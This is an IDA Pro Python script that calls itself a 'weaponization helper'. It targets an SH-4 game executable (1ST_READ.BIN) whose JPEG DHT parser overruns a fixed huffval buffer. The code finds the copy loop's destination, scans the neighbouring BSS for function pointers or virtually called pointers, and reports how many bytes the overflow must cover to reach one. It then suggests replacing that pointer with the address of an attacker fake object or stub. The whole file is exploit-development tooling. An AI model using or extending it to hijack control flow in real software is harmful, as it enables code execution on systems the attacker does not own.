"""
ida_huffval_bssmap.py -- F-12 weaponization helper for 1ST_READ.BIN in IDA 9.x.

Two jobs:
  1. dht_buffer(get_dht_ea): disassemble get_dht, resolve every PC-relative
     literal it loads, find the byte-store COPY LOOP, and attribute the loop's
     destination -> the fixed huffval[] base (the JHUFF_TBL the DHT overruns).
  2. bss_map(base, span): walk memory after `base` 4 bytes at a time and, for
     each slot, report image-wide literal references + whether the slot is a
     CONTROL TARGET (holds a code pointer, or is virtual-called). Picks the
     nearest control target above `base` => the overflow length to weaponize.

Usage (in IDA, after running ida_recover_functions.py):
  - Find get_dht (Search->Immediate value->80 = JTRC_DHT), then set GET_DHT below
    OR call directly in the Python CLI:
        exec(open(r".../ida_huffval_bssmap.py").read())   # prints get_dht candidates
        dht_buffer(0x8Cxxxxxx)        # -> prints huffval base
        bss_map(0x8Cxxxxxx, 0x400)    # -> maps adjacent BSS, picks control target

Config: set GET_DHT (or HUFFVAL_BASE to skip detection) and re-exec to auto-run.

SH-4 is fixed 16-bit LE. Decoding is done from raw bytes so it does not depend
on IDA having perfectly typed every literal pool.
"""
import struct
import ida_bytes
import ida_funcs
import ida_auto
import idautils
import idc

BASE = 0x8C010000
END  = 0x8C44A0C0                 # BASE + filesize 0x43A0C0
# Writable globals (.data/.bss) start well past .text; known live globals sit at
# 0x8C29xxxx / 0x8C37xxxx. Treat addresses >= DATA_LO as "data/BSS pointers".
DATA_LO = 0x8C200000

# ---- config: set one of these and re-exec to auto-run -----------------------
GET_DHT      = 0      # get_dht entry; if set, main() resolves huffval base
HUFFVAL_BASE = 0      # if set, skip detection and map this base directly
MAP_SPAN     = 0x400  # bytes of BSS to map after the base

_img = None
def img():
    global _img
    if _img is None:
        _img = ida_bytes.get_bytes(BASE, END - BASE)
    return _img


# --------------------------------------------------------------------------- #
# SH-4 helpers (16-bit words, little-endian)
# --------------------------------------------------------------------------- #
def w(ea):                       # instruction word
    return ida_bytes.get_word(ea)

def dword(ea):
    return ida_bytes.get_dword(ea)

def pcrel_long(ea, word):
    """mov.l @(disp,pc),Rn = 1101 nnnn dddddddd. Returns (reg, lit_addr, value)."""
    if (word & 0xF000) != 0xD000:
        return None
    n = (word >> 8) & 0xF
    disp = word & 0xFF
    lit = ((ea + 4) & ~3) + disp * 4
    return (n, lit, dword(lit))

def is_byte_store(word):
    """mov.b Rm,@Rn (0x2nm0) or mov.b Rm,@(R0,Rn) (0x0nm4). Returns base reg n."""
    if (word & 0xF00F) == 0x2000:
        return (word >> 8) & 0xF
    if (word & 0xF00F) == 0x0004:
        return (word >> 8) & 0xF
    return None

def writes_reg(ea, word, reg):
    """True if this insn sets `reg` via a PC-rel long load or mov Rm,Rn into reg."""
    pl = pcrel_long(ea, word)
    if pl and pl[0] == reg:
        return ("load", pl[2])
    if (word & 0xF00F) == 0x6003 and ((word >> 8) & 0xF) == reg:   # mov Rm,Rn
        return ("mov", (word >> 4) & 0xF)
    if (word & 0xF000) == 0xE000 and ((word >> 8) & 0xF) == reg:   # mov #imm,Rn
        return ("imm", word & 0xFF)
    return None


# --------------------------------------------------------------------------- #
# 1) get_dht -> huffval base
# --------------------------------------------------------------------------- #
def dht_buffer(func_ea, verbose=True):
    f = ida_funcs.get_func(func_ea)
    if not f:
        print("[!] no function at %08X (run ida_recover_functions.py first)" % func_ea)
        return None
    items = list(idautils.FuncItems(func_ea))
    # all PC-relative long constants used by the function
    lits = []
    for ea in items:
        pl = pcrel_long(ea, w(ea))
        if pl:
            lits.append((ea, pl[2]))
    data_lits = [(ea, v) for ea, v in lits if DATA_LO <= v < END]
    if verbose:
        print("=== get_dht @ %08X : %d insns ===" % (func_ea, len(items)))
        print("PC-relative data/BSS pointers loaded (huffval candidates):")
        for ea, v in data_lits:
            print("    @%08X  -> %08X" % (ea, v))

    # find the COPY LOOP: a byte-store whose base register traces back to a
    # data/BSS literal. Back-walk from each byte-store within the function.
    base_guess = None
    for idx, ea in enumerate(items):
        breg = is_byte_store(w(ea))
        if breg is None:
            continue
        # back-walk for the last writer of breg
        for j in range(idx - 1, max(0, idx - 40), -1):
            pea = items[j]
            wr = writes_reg(pea, w(pea), breg)
            if wr is None:
                continue
            if wr[0] == "load" and DATA_LO <= wr[1] < END:
                if verbose:
                    print("[*] byte-store @%08X base=R%d <- literal %08X"
                          % (ea, breg, wr[1]))
                base_guess = wr[1]
            break
    if base_guess:
        print("[+] huffval / copy-dest base = %08X" % base_guess)
    else:
        print("[!] copy-dest not auto-attributed; pick from the data pointers above")
    return base_guess


def find_dht_candidates():
    """List functions that load immediate 80 (JTRC_DHT) -- get_dht is among them."""
    print("get_dht candidates (functions loading #80 = JTRC_DHT):")
    data = img()
    seen = set()
    # mov #80,Rn = 1110 nnnn 0101 0000 = 0xEn50 ; LE bytes: 0x50 0xE?
    for p in range(0, len(data) - 1, 2):
        word = data[p] | (data[p + 1] << 8)
        if (word & 0xF0FF) == 0xE050:                 # mov #80,Rn
            ea = BASE + p
            f = ida_funcs.get_func(ea)
            if f and f.start_ea not in seen:
                seen.add(f.start_ea)
    # also load #16 (length>16) narrows it; report all, flag those also using #16
    has16 = set()
    for p in range(0, len(data) - 1, 2):
        word = data[p] | (data[p + 1] << 8)
        if (word & 0xF0FF) == 0xE010:                 # mov #16,Rn
            f = ida_funcs.get_func(BASE + p)
            if f:
                has16.add(f.start_ea)
    for s in sorted(seen):
        flag = "  <== also loads #16 (length>16 loop): likely get_dht" if s in has16 else ""
        print("    %08X%s" % (s, flag))
    if not seen:
        print("    (none -- did functions get recovered? run ida_recover_functions.py)")
    return sorted(seen)


# --------------------------------------------------------------------------- #
# 2) map adjacent BSS -> control target
# --------------------------------------------------------------------------- #
def _refs_to(addr):
    """Image-wide locations holding the 4-byte LE value `addr` (literal pools)."""
    data = img()
    pat = struct.pack("<I", addr)
    out, i = [], 0
    while True:
        j = data.find(pat, i)
        if j < 0:
            break
        if j % 2 == 0:
            out.append(BASE + j)
        i = j + 1
    return out

def _loaded_then_called(litloc):
    """Heuristic: is the literal at `litloc` loaded then jsr/jmp'd through (fn-ptr),
    or deref'd-then-called (virtual)? Find the mov.l @(disp,pc) that targets litloc,
    then scan forward a few insns for jsr/jmp @Rn."""
    # find loading insn within 0x400 before litloc
    for ea in range(litloc - 2, litloc - 0x400, -2):
        if ea < BASE:
            break
        pl = pcrel_long(ea, w(ea))
        if pl and pl[1] == litloc:
            reg = pl[0]
            # forward scan
            cur = reg
            for k in range(1, 12):
                nea = ea + 2 * k
                ww = w(nea)
                # mov.l @Rm,Rn  (deref) 0110 nnnn mmmm 0010 = 0x6nm2
                if (ww & 0xF00F) == 0x6002 and ((ww >> 4) & 0xF) == cur:
                    cur = (ww >> 8) & 0xF
                    continue
                # jsr @Rn 0x4n0B / jmp @Rn 0x4n2B
                if (ww & 0xF0FF) == 0x400B and ((ww >> 8) & 0xF) == cur:
                    return True
                if (ww & 0xF0FF) == 0x402B and ((ww >> 8) & 0xF) == cur:
                    return True
            return False
    return False

def is_code_ptr(val):
    return BASE <= val < DATA_LO and (idc.is_code(ida_bytes.get_full_flags(val))
                                      or ida_funcs.get_func(val) is not None)

def bss_map(base, span=MAP_SPAN):
    print("=== BSS map from %08X (+%04X) ===" % (base, span))
    print(" off    addr      value     refs codeptr called  note")
    targets = []
    for off in range(0, span, 4):
        addr = base + off
        val = dword(addr)
        refs = _refs_to(addr)
        cp = is_code_ptr(val)
        called = any(_loaded_then_called(r) for r in refs) if refs else False
        note = ""
        if cp:
            note = "<- holds fn-ptr %08X" % val
        elif called:
            note = "<- virtual-called pointer"
        if (cp or called) and off > 0:
            targets.append((off, addr, val, cp, called))
        print(" +%04X  %08X  %08X  %3d   %s     %s   %s"
              % (off, addr, val, len(refs), "Y" if cp else ".",
                 "Y" if called else ".", note))
    print("-" * 64)
    if targets:
        off, addr, val, cp, called = targets[0]
        kind = "fn-ptr" if cp else "virtual-called ptr"
        print("[+] nearest control target above base: %08X (+0x%X, %d bytes past base)"
              % (addr, off, off))
        print("    type=%s  current value=%08X" % (kind, val))
        print("    => DHT count must overrun ~0x%X bytes of huffval to reach it" % (off))
        print("    overwrite it with the addr of an attacker fake-object / SH-4 stub.")
    else:
        print("[!] no clean control target in +0x%X; widen span or inspect refs cols"
              % span)
    return targets


# --------------------------------------------------------------------------- #
def main():
    base = 0
    if HUFFVAL_BASE:
        base = HUFFVAL_BASE
    elif GET_DHT:
        base = dht_buffer(GET_DHT)
    if base:
        print()
        bss_map(base, MAP_SPAN)
    else:
        find_dht_candidates()
        print("\nSet GET_DHT (or HUFFVAL_BASE) at top and re-exec, or call:")
        print("    dht_buffer(<get_dht_ea>)   then   bss_map(<huffval_base>, 0x400)")


if __name__ == "__main__":
    main()
